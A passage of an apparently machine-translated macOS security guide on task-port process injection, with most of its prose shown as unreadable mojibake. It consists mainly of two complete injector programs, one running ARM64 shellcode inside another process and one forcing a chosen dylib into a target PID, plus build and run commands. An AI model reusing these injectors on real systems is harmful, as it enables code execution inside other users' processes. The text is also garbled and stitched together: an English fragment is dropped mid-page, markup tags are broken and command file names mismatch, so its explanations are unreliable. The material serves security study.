**рдЕрдзрд┐рдХрд╛рд░ (Entitlements)** рдПрдХ XML рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд┐рд╢реЗрд╖ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдФрд░ рдЕрдиреБрдХреВрд▓рди рджреЗрддрд╛ рд╣реИред рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЕрдиреБрдХреВрд▓рди рд╕реНрддрд░ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрдВрдЯрд░-рдкреНрд░реЛрд╕реЗрд╕ рдХрдореНрдпреВрдирд┐рдХреЗрд╢рди (IPC) рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ рдЬреЛ IPC рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд▓рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ:

```xml
<key>com.apple.security.network.client</key>
<true/>
<key>com.apple.security.network.server</key>
<true/>
```

рдпрд╣рд╛рдБ, `com.apple.security.network.client` рдФрд░ `com.apple.security.network.server` рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВ рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдФрд░ **рдЕрдзрд┐рдХрд╛рд░** рдЬреЛрдбрд╝реЗрдВ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде (рдЕрдЧрд░ рдирд╣реАрдВ рддреЛ рдЖрдкрдХреЛ **sudo** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛)ред

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
рдЗрд╕реЗ iOS рдкрд░ рдХрд╛рдо рдХрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЕрдзрд┐рдХрд╛рд░ `dynamic-codesigning` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдореЗрдореЛрд░реА рдХреЛ рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдмрдирд╛ рд╕рдХреЗрдВред
{% endhint %}

### рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдереНрд░реЗрдб рдореЗрдВ Dylib рдЗрдВрдЬреЗрдХреНрд╢рди

macOS рдореЗрдВ **рдереНрд░реЗрдб** рдХреЛ **Mach** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛ **posix `pthread` рдПрдкреАрдЖрдИ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рдордиреЗ рдкрд┐рдЫрд▓реЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдореЗрдВ рдЬрд┐рд╕ рдереНрд░реЗрдб рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдерд╛, рд╡рд╣ Mach рдПрдкреАрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЗрд╕рд▓рд┐рдП **рдпрд╣ posix рдЕрдиреБрд░реВрдк рдирд╣реАрдВ рд╣реИ**ред

рдПрдХ рд╕рд░рд▓ рд╢реИрд▓реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд░рд▓ рд╢реИрд▓реА рдХреЛ **рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛** рддрд╛рдХрд┐ рдПрдХ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ **posix рдЕрдиреБрд░реВрдк рдПрдкреАрдЖрдИ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рдереА**, рдХреЗрд╡рд▓ Mach рдХреЗ рд╕рд╛рдеред **рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рдЗрдВрдЬреЗрдХреНрд╢рди** рдХреЗ рд▓рд┐рдП **рдереНрд░реЗрдб** рдХреЛ рднреА **posix рдЕрдиреБрд░реВрдк рд╣реЛрдирд╛** рдЪрд╛рд╣рд┐рдПред

рдЗрд╕рд▓рд┐рдП, **рдереНрд░реЗрдб** рдХреЛ рд╕реБрдзрд╛рд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **`pthread_create_from_mach_thread`** рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдПрдХ рдорд╛рдиреНрдп pthread рдмрдирд╛рдПрдЧрд╛ред рдлрд┐рд░, рдЗрд╕ рдирдП pthread рдХреЛ **dlopen рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЙрд╕реЗ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдПрдХ dylib рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдирдП рд╢реИрд▓реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирдП рд╢реИрд▓реА рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдмрдЬрд╛рдп рдЕрдиреБрдХреВрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рдЖрдк (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЬреЛ рдПрдХ рд▓реЙрдЧ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЖрдк рдЗрд╕реЗ рд╕реБрди рд╕рдХрддреЗ рд╣реИрдВ) рдореЗрдВ **рдЙрджрд╛рд╣рд░рдг dylibs** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"рджреВрд░рд╕реНрде рдзрд╛рдЧреЗ рдХреЗ рдХреЛрдб рдХреЗ рд▓рд┐рдП рд╕реНрдореГрддрд┐ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде: рддреНрд░реБрдЯрд┐ %s\n", mach_error_string(kr));
return (-4);
}

// рдЖрд╡рдВрдЯрд┐рдд рд╕реНрдЯреИрдХ рд╕реНрдореГрддрд┐ рдкрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕реЗрдЯ рдХрд░реЗрдВ
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"рджреВрд░рд╕реНрде рдзрд╛рдЧреЗ рдХреЗ рд╕реНрдЯреИрдХ рдХреЗ рд▓рд┐рдП рд╕реНрдореГрддрд┐ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде: рддреНрд░реБрдЯрд┐ %s\n", mach_error_string(kr));
return (-4);
}


// рд╢реИрд▓рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдзрд╛рдЧрд╛ рдмрдирд╛рдПрдВ
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // рдпрд╣ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдЯреИрдХ рд╣реИ
//remoteStack64 -= 8;  // 16 рдХреА рд╕рдВрд░реЗрдЦрдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("рджреВрд░рд╕реНрде рд╕реНрдЯреИрдХ 64  0x%llx, рджреВрд░рд╕реНрде рдХреЛрдб рд╣реИ %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"рджреВрд░рд╕реНрде рдзрд╛рдЧрд╛ рдмрдирд╛рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде: рддреНрд░реБрдЯрд┐ %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "рдЙрдкрдпреЛрдЧ: %s _pid_ _рдХреНрд░рд┐рдпрд╛_\n", argv[0]);
fprintf (stderr, "   _рдХреНрд░рд┐рдпрд╛_: рдбрд┐рд╕реНрдХ рдкрд░ рдПрдХ dylib рдХрд╛ рдкрде\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib рдирд╣реАрдВ рдорд┐рд▓рд╛\n");
}

}
```
</details>  

### macOS IPC (Inter-Process Communication)

#### Introduction

Inter-process communication (IPC) mechanisms in macOS can be abused by attackers to escalate privileges and manipulate processes. Understanding how IPC works in macOS is crucial for identifying and exploiting potential vulnerabilities.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### рдереНрд░реЗрдб рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдПрдХ рдереНрд░реЗрдб рд╣рд╛рдЗрдЬреИрдХ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### рдЯрд╛рд╕реНрдХ рдкреЛрд░реНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдбрд┐рдЯреЗрдХреНрд╢рди

`task_for_pid` рдпрд╛ `thread_create_*` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ рдХрд░реНрдирд▓ рд╕реЗ рдЯрд╛рд╕реНрдХ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ рдПрдХ рдХрд╛рдЙрдВрдЯрд░ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЛрдб рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ `task_info(task, TASK_EXTMOD_INFO, ...)`ред

## рдЕрдкрд╡рд╛рдж рдкреЛрд░реНрдЯ

рдЬрдм рдХрд┐рд╕реА рдереНрд░реЗрдб рдореЗрдВ рдПрдХ рдЕрдкрд╡рд╛рдж рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрдкрд╡рд╛рдж рдереНрд░реЗрдб рдХреЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЕрдкрд╡рд╛рдж рдкреЛрд░реНрдЯ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЕрдЧрд░ рдереНрд░реЗрдб рдЗрд╕реЗ рд╕рдВрднрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣ рдЯрд╛рд╕реНрдХ рдЕрдкрд╡рд╛рдж рдкреЛрд░реНрдЯ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЕрдЧрд░ рдЯрд╛рд╕реНрдХ рдЗрд╕реЗ рд╕рдВрднрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣ рд╣реЛрд╕реНрдЯ рдкреЛрд░реНрдЯ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд▓реЙрдиреНрдЪрдб (рдЬрд┐рд╕реЗ рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рдЕрдкрд╡рд╛рдж рдЯреНрд░рд╛рдпреЗрдЬ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

